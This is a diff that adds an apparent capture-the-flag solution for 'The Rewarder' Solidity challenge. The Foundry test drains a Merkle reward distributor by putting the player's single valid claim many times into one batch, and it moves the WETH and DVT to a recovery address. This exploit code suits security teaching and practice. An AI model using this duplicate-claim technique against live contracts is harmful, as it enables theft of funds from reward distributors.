@@ -148,7 +148,85 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        // notice: exploit the fact that we can claim same amount multiple times
+        _claimWeth();
+        _claimDvt();
+    }
+
+    function _claimWeth() private {
+        (
+            uint256 playerClaimAmount,
+            uint256 nodeIndex
+        ) = _findPlayerClaimAmountAndIndex("/test/the-rewarder/weth-distribution.json");
+
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        uint256 claimSize = TOTAL_WETH_DISTRIBUTION_AMOUNT / playerClaimAmount;
+
+        IERC20[] memory tokensToClaim = new IERC20[](1);
+        tokensToClaim[0] = IERC20(address(weth));
+
+        Claim[] memory claims = new Claim[](claimSize);
+        Claim memory claim = Claim({
+            batchNumber: 0,
+            amount: playerClaimAmount,
+            tokenIndex: 0,
+            proof: merkle.getProof(wethLeaves, nodeIndex)
+        });
+        for (uint256 i = 0; i < claims.length; i++) {
+            claims[i] = claim;
+        }
+
+        uint256 playerWethBalanceBefore = weth.balanceOf(player);
+        uint256 distributorWethBalanceBefore = weth.balanceOf(address(distributor));
+
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+
+        uint256 playerWethBalanceAfter = weth.balanceOf(player);
+        uint256 distributorWethBalanceAfter = weth.balanceOf(address(distributor));
+
+        assertEq(playerWethBalanceAfter, playerWethBalanceBefore + playerClaimAmount * claimSize);
+        assertEq(distributorWethBalanceAfter, distributorWethBalanceBefore - playerClaimAmount * claimSize);
+
+        weth.transfer(recovery, playerClaimAmount * claimSize);
+    }
+
+    function _claimDvt() private {
+         (
+            uint256 playerClaimAmount,
+            uint256 nodeIndex
+        ) = _findPlayerClaimAmountAndIndex("/test/the-rewarder/dvt-distribution.json");
+
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+
+        uint256 claimSize = TOTAL_DVT_DISTRIBUTION_AMOUNT / playerClaimAmount;
+
+        IERC20[] memory tokensToClaim = new IERC20[](1);
+        tokensToClaim[0] = IERC20(address(dvt));
+
+        Claim[] memory claims = new Claim[](claimSize);
+        Claim memory claim = Claim({
+            batchNumber: 0,
+            amount: playerClaimAmount,
+            tokenIndex: 0,
+            proof: merkle.getProof(dvtLeaves, nodeIndex)
+        });
+        for (uint256 i = 0; i < claims.length; i++) {
+            claims[i] = claim;
+        }
+
+        uint256 playerDvtBalanceBefore = dvt.balanceOf(player);
+        uint256 distributorDvtBalanceBefore = dvt.balanceOf(address(distributor));
+
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+
+        uint256 playerDvtBalanceAfter = dvt.balanceOf(player);
+        uint256 distributorDvtBalanceAfter = dvt.balanceOf(address(distributor));
+
+        assertEq(playerDvtBalanceAfter, playerDvtBalanceBefore + playerClaimAmount * claimSize);
+        assertEq(distributorDvtBalanceAfter, distributorDvtBalanceBefore - playerClaimAmount * claimSize);
+
+        dvt.transfer(recovery, playerClaimAmount * claimSize);
     }
 
     /**
@@ -186,6 +264,21 @@ contract TheRewarderChallenge is Test {
         leaves = new bytes32[](BENEFICIARIES_AMOUNT);
         for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
             leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
+        }
+    }
+
+    function _findPlayerClaimAmountAndIndex(string memory path)
+        private view returns (uint256 amount, uint256 index) 
+    {
+        Reward[] memory rewards =
+            abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Reward[]));
+
+        for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
+            if (rewards[i].beneficiary == player) {
+                amount = rewards[i].amount;
+                index = i;
+                break;
+            }
         }
     }
 }
